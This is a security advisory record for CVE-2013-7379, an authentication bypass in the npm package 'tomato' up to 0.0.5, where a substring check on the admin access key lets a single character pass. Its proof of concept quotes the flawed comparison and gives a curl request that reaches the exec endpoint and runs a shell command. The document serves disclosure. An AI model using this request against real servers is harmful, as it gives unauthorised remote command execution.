advisory_id: GHSA-9vxc-g2jx-qj3p
datasource_id: github_osv_importer_v2/GHSA-9vxc-g2jx-qj3p
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/08/GHSA-9vxc-g2jx-qj3p/GHSA-9vxc-g2jx-qj3p.json
aliases:
  - CVE-2013-7379
summary: |
  API Admin Auth Weakness in tomato
  Versions of `tomato` prior to 0.0.6 are affected by a somewhat complex authentication bypass vulnerability in the admin service when only a single access key is configured on the server. The vulnerability allows an attacker to guess the password for the admin service, no matter how complex that password is, in less than 200 requests.


  ## Details
  The tomato API has an admin service that is enabled by setting up an `access_key` in the config options. This `access_key` is intended to protect the API admin from unauthorized access.


  Tomato verifies the `access_key` by checking to see if the server `access_key` incorporates the user provided value at any location. This allows an attacker to provide a single character as an `access_key`, and so long as the server key contains at least one instance of that character it will be considered a valid key.

  ## Proof of Concept
  This is the snippet of code that does the comparison to authorize requests.

  ```
  if (access_key && config.master.api.access_key.indexOf(access_key) !== -1) {
  ```

  For an access_key that is set to anything that includes the letter 'a' the following request would be authorized.

  ```
  $ curl -X POST "http://localhost:8081/api/exec" -H "Content-Type: application/json" -d @test -H "access-key: a"
  {
   "cmd": "ls",
   "path": ".",
   "stdout": "app.js\nconfig.js\nlog\nnode_modules\nserver.js\n",
   "stderr": ""
  }
  ```



  ## Recommendation

  Update to version 0.0.6 or later.
impacted_packages:
  - purl: pkg:npm/tomato
    affected_versions: vers:npm/<=0.0.5
    fixed_versions: vers:npm/0.0.6
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-287
references:
  - url: https://github.com/leizongmin/tomato
    reference_type:
    reference_id:
  - url: https://github.com/leizongmin/tomato/commit/9e427d524e04a905312a3294c85e939ed7d57b8c
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/38
    reference_type:
    reference_id:
  - url: http://www.openwall.com/lists/oss-security/2014/05/13/1
    reference_type:
    reference_id:
  - url: http://www.openwall.com/lists/oss-security/2014/05/15/2
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2013-7379
    reference_type:
    reference_id: CVE-2013-7379
